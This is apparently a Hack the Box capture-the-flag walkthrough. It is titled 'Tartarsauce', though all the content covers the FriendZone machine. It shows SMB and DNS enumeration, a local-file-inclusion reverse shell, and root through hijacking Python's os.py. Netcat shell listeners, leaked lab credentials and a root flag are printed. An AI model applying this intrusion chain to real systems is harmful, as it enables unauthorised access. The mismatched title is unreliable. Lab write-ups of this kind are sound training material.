## 1. Machine Info



Tartarsauce is a medium-rated, retired machine from Hack the Box. It's a wonderful machine which enables us to learn how to enumerate everthing.


Since OSCP's unofficial motto is "enumerate harder", it's definitely worth to look into this machine.

> As always, let's dive into the machine!

## 2. Enumeration

We start with nmap scan.

....and so on
```

There are several services running on our host:

- ftp 
- samba
- http
- https
- dns

FTP wasn't interesting at all. So I'll skip this one and start with samba

### 2.1 Samba

With quick search with crackmapexec, I could easily find that we have read access on “general” and r/w access on “Development” share. And in general share:

```
┌──(hosan㉿kali)-[~/oscp/htb-box/friendzone]
└─$ smbclient //10.10.10.123/general    
Password for [WORKGROUP\hosan]:

  ..                                  D        0  Tue Sep 13 10:56:24 2022
  creds.txt                           N       57  Tue Oct  9 19:52:42 2018
```

We could find creds.txt with admin:WORKWORKHhallelujah@#. Good start indeed, but we still don't know where to use this credential. Thus, Let’s move on to DNS

### 2.2 DNS Zone Transfer

I just quickly tried zone transfer on our host friendzone.red (revealed from nmap scan)


It is always better to enumerate subdomain (not vhost, vhost can be enumerated with e.g. FFUF) with DNS if DNS server is on presence.

```
┌──(hosan㉿kali)-[~/oscp/htb-box/friendzone]
└─$ dig axfr friendzone.red @10.10.10.123 
; <<>> DiG 9.19.21-1-Debian <<>> axfr friendzone.red @10.10.10.123
;; global options: +cmd

friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1

friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 124 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
;; WHEN: Fri Aug 16 14:23:27 EDT 2024
;; XFR size: 8 records (messages 1, bytes 289)
```

So we found 3 subdomains, hr.friendzone, uploads.friendzone and administrator1.friendzone.


Now it's time to move on to webapp.

### 2.3 HTTP friendzone.red

(second photo)

I tried to enumerate subdirectories with ffuf, but couldn't find single entry and found subdomains via DNS weren't there. So maybe we should try https.

### 2.4 HTTPS friendzone.red

https://friendzone.red showed me slightly different index page, but also nothing interesting was found during subdirectory enumeration. So I added administrator1 to my /etc/hosts and proceed.

(Login Form)

So here is a Login form and I immediately tried my credential which I found earlier.


Website showed me a quick message:

> Login Done! visit /dashboard.php

So I did:

(dashboard.php)

It is pretty obious that we have some kind of LFI or Injection, since we have 2 parameters. After struggling a while, I could find out that pagename may potentially cause a problem:

(abused)

Since we know that this /dashboard entry is generated by dashboard.php, this output indicates that ./php_filename_without_extension would call php_filename_without_extension.php


So, if we can somehow upload a revshell.php and access it via LFI vector, we could obtain a revshell.


## 3. Initial Foothold

I remebered that we had a write permission on /Development in SMB part. After googling, I found out how to reveal an absolute path of a SMB share with nmap script.

```
┌──(hosan㉿kali)-[~/oscp/htb-box/friendzone]
└─$ sudo nmap 10.10.10.123 -p445 -Pn -sC --script smb-enum-shares.nse
[sudo] password for hosan: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-16 16:06 EDT
Nmap scan report for friendzone.red (10.10.10.123)
Host is up (0.047s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.10.123\Development: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\Development
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
....and so on
```

So we got an absolute path, a LFI vector AND a write permission. If we visit /etc/Development/test (there is test.php which only executes echo “Please subscribe”)

(echo)

We can indeed see that test.php is being executed.

Now, everything combined:

```
┌──(hosan㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.14] from (UNKNOWN) [10.10.10.123] 57610
Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

I got a revshell. So there was only three steps:

1. Modified rev.php and upload it
2. Opened port to listen incoming connection
3. Visited our rev.php with LFI vector : pagename=/etc/Development/rev


## 4. Privilege Escalation

Even if www-data already gives us the user flag, I found a credential of the user friend:
```
$ cd /var/www
$ ls
admin
friendzone
friendzoneportal
friendzoneportaladmin
html
mysql_data.conf
uploads
$ cat mysql_data.conf     
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```
And I could sue it for ssh connection.

### 4.1 Using Pspy

After executing pspy on our victim host,
```
2024/08/16 23:40:01 CMD: UID=0    PID=3203   | /usr/bin/python /opt/server_admin/reporter.py 
2024/08/16 23:40:01 CMD: UID=0    PID=3202   | /bin/sh -c /opt/server_admin/reporter.py 
2024/08/16 23:40:01 CMD: UID=0    PID=3201   | /usr/sbin/CRON -f 
```
I found this suspicious reporter.py


reporter.py imports os, but does not use it. So I couldn’t modify the script to execute some commands. (I also didn’t have write privielge) After searching for a while, I noticed there is a potential risk if a non-privileged user can modify the library itself.

> So I looked after /usr/lib/python2.7/os.py:

The mechanism is pretty simple:

1. Loading python module is actually compiling it.
2. So if we modify os.py, modified part of code will be executed every time os is being imported.
3. We can simply add some scripts at the end of the os.py!

So I modified the end of the file like this:

(photo)

And waited calmly… (I thought importing os in os.py would not work and tried to do it again, but it worked anyway)

```
┌──(hosan㉿kali)-[~]
└─$ nc -lvnp 8080
listening on [any] 8080 ...
connect to [10.10.16.14] from (UNKNOWN) [10.10.10.123] 38182
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
667053ead4657d95ce354e508e17ec07
```
And that’s pretty much it!

## 5. Review

While I didn’t mention it earlier, there were numerous rabbit holes, such as the /upload endpoint, which initially seemed like a promising vector for the initial foothold.


However, this led to some challenges and required a bit of perseverance to find the correct path.


Overall, this machine serves as valuable preparation for OSCP, given the extensive enumeration required.


It could be improved by more clearly distinguishing between legitimate paths and false positives.
